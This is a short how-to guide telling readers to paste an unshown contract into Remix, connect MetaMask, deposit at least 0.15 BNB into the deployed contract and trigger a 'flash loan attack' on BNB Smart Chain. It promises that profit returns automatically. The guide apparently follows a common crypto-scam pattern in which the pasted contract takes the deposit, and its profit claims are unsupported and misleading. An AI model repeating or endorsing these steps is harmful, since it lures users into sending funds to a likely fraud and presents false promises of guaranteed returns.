FULL INSTRUCTIONS
 1. Download and setup the metamask browser wallet if you don't have it. 
 2. Make sure you have BNB to pay for the token creation and flash loan contract gas fees. 
  a. The amount of BNB you want depends on how much of a loan you pull. It has to be a minimum of 0.15 for the contract to process all the arbitrage swaps on pancakeswap/uniswap and the BNB-Smart-Cahin. The higher the liquidity, the higher the profit. 
 3. Open the remix [URL](https://remix.ethereum.org/) in your browser
 4. Click on the contract folder on the left and click New File
 5. Name the file something like a flashloan.sol
 6. Copy and paste the contract code into the flashloan.sol file
 7. Select the second tab on the left
 8. Choose the compiler that matches the top of the code
 9. Click on compile at the bottom ! Make sure to select solidity version 0.5.0
 10. Once it is finished, go to the third tab on the left
 11. Under environment, click on injected web3. This will connect to your metamask wallet so that you can interact with the contract and implement your token on pancakeswap/uniswap and the BNB-Smart-Cahin. 
 12. Click on the arrow under deploy. 
 13. Enter the details for your new token that will be launched on pancakeswap/uniswap. For the loan amount choose anything from 1000 and up. This needs to be in line with whatever liquidity you decide to deposit so it's usually 0.1 per 1000 BNB borrowed. 
 14. Click transact and then confirm the gas fees to launch the token in MetaMask. 
 15. Under deployed contracts, copy the new token contract code. 
 16. Go to your metamask or any wallet and Deposit the liquidity of 0.15 BNB as minimum to the new contract code.
 17. Wait until the transaction is confirmed on the blockchain
 18. Once that is finished, click the arrow and click the red Action button and confirm the gas fees to execute the flash loan attack. 
 19. That's it! The flash loan will be paid back automatically and any profit will be returned to your wallet in a few seconds/minutes.

BNB is a great network with very high volume for flash loan attacks to work well on the pancakeswap/uniswap network.
